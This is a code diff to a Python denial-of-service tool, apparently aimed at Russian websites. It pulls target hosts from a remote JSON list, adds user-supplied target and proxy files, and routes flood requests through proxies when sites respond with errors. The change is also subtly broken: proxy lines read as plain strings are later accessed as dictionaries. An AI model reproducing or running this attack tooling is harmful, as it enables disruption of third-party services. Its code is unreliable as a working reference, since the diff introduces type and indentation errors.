@@ -34,6 +34,8 @@ class FuckYouRussianShip:
     SUPPORTED_PLATFORMS = {
         'linux': 'Linux'
     }
+    PROXIES = [""]
+    FILE_TARGETS = [""]
 
     def __init__(self):
         disable_warnings()
@@ -45,11 +47,23 @@ class FuckYouRussianShip:
         self.targets = self.args.targets
         self.threads = int(self.args.threads)
 
+        out_file = str(input("Enter the proxylist filename/path, default: (proxies.txt) "))
+        if out_file == "":
+            out_file = "proxies.txt"
+        self.PROXIES = open(out_file).readlines()
+
         try:
             self.HOSTS = json.loads(requests.get("http://rockstarbloggers.ru/hosts.json").content)
         except:
             sleep(5)
             self.HOSTS = json.loads(requests.get("http://rockstarbloggers.ru/hosts.json").content)
+        
+
+        targets_file = input("Enter the targets list path, default: (targets.txt) ")
+        if targets_file == "":
+            targets_file = "targets.txt"
+        self.HOSTS = self.HOSTS + open(targets_file).readlines()
+        print(self.HOSTS)
 
         global work_statistic
         global statistic
@@ -59,10 +73,7 @@ class FuckYouRussianShip:
 
     @staticmethod
     def clear():
-        if platform.system() == "Linux":
             return system('clear')
-        else:
-            return system('cls')
 
     def create_parser(self):
         parser_obj = ArgumentParser()
@@ -164,7 +175,7 @@ class FuckYouRussianShip:
                 self.write_statistic_success(site, attack.status_code)
 
                 if attack.status_code >= 302:
-                    for proxy in data['proxy']:
+                    for proxy in self.PROXIES:
                         if self.proxy_view:
                             print('USING PROXY:' + proxy["ip"] + " " + proxy["auth"])
                         scraper.proxies.update(
